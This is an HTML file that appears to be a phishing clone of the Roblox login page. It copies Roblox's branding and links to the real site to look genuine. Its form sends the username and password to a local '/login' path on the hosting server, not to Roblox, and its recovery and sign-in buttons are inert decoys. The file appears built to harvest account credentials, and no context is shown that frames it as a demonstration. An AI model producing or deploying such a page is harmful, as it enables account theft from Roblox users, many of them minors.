<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #101014; 
            background-image: linear-gradient(to bottom, #101014, #181822); 
            height: 100vh;
            color: #fff;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        header {
            background-color: #181a1c;
            display: flex;
            flex-direction: column;
            padding: 10px 20px;
            box-sizing: border-box;
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background-color: #fff;
            border-radius: 4px;
            display: flex;
            justify-content: center;
            align-items: center;
            transform: rotate(45deg);
            cursor: pointer;
        }
        .logo-icon::after {
            content: '';
            width: 12px;
            height: 12px;
            background-color: #181a1c;
            border-radius: 2px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .signup-btn {
            background-color: #2d65ff;
            color: #fff;
            border: none;
            padding: 7px 16px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        .signup-btn:hover {
            background-color: #1a4ed8;
        }

        .search-icon {
            font-size: 24px;
            cursor: pointer;
            color: #fff;
            font-weight: 300;
        }

        .nav-links {
            display: flex;
            gap: 40px;
            font-size: 16px;
            font-weight: 500;
            padding-bottom: 5px;
        }
        .nav-links a {
            cursor: pointer;
            color: #fff;
            text-decoration: none;
        }
        .nav-links a:hover {
            color: #ccc;
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-modal {
            background-color: #232527;
            padding: 40px 35px;
            border-radius: 6px;
            width: 420px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.6);
            text-align: center;
            box-sizing: border-box;
        }

        h2 { 
            margin-top: 0; 
            margin-bottom: 25px; 
            font-size: 28px; 
            font-weight: 700; 
            color: #fff;
        }

        .input-group { 
            margin-bottom: 12px; 
        }
        
        input {
            width: 100%; 
            padding: 14px; 
            background-color: #393b3d; 
            border: 1px solid #555;
            border-radius: 6px; 
            color: #fff; 
            font-size: 16px; 
            box-sizing: border-box;
        }
        input::placeholder { 
            color: #a0a0a0; 
        }
        input:focus { 
            outline: none; 
            border-color: #fff; 
        }

        .login-btn {
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1px solid #fff;
            border-radius: 6px; 
            color: #fff; 
            font-size: 17px; 
            font-weight: 500; 
            cursor: pointer;
            margin-top: 5px; 
            margin-bottom: 25px;
        }
        .login-btn:hover { 
            background-color: rgba(255, 255, 255, 0.1); 
        }

        .forgot-link { 
            display: block; 
            margin-bottom: 25px; 
            font-size: 16px; 
            color: #fff; 
            text-decoration: none; 
            cursor: default;
        }

        .divider { 
            border-top: 1px solid #444; 
            margin: 20px 0; 
        }

        .secondary-btn {
            width: 100%; 
            padding: 14px; 
            background-color: #393b3d; 
            border: none; 
            border-radius: 6px;
            color: #fff; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: default; 
            margin-bottom: 12px;
        }

        .signup-text { 
            margin-top: 25px; 
            font-size: 15px; 
            color: #fff;
        }
        .signup-text span { 
            color: #fff; 
            font-weight: bold;
            cursor: default;
        }
    </style>
</head>
<body>

    <header>
        <div class="header-top">
            <div class="logo-icon" onclick="window.location.reload()"></div>
            <div class="header-right">
                <button class="signup-btn">Sign Up</button>
                <span class="search-icon">&#128269;</span>
            </div>
        </div>
        
        <div class="nav-links">
            <a href="https://www.roblox.com/charts" target="_blank">Charts</a>
            <a href="https://www.roblox.com/catalog" target="_blank">Marketplace</a>
            <a href="https://www.roblox.com/develop" target="_blank">Create</a>
            <a href="https://www.roblox.com/upgrades/robux" target="_blank">Robux</a>
        </div>
    </header>

    <div class="main-content">
        <div class="login-modal">
            <h2>Login to Roblox</h2>
            
            <form method="POST" action="/login">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Username/Email/Phone" required autocomplete="off">
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>

                <button type="submit" class="login-btn">Log In</button>
            </form>

            <span class="forgot-link">Forgot Password or Username?</span>

            <div class="divider"></div>

            <div class="secondary-btn">Email Me a One-Time Code</div>
            <div class="secondary-btn">Quick Sign-in</div>

            <div class="signup-text">
                Don't have an account? <span>Sign Up</span>
            </div>
        </div>
    </div>

</body>
</html>
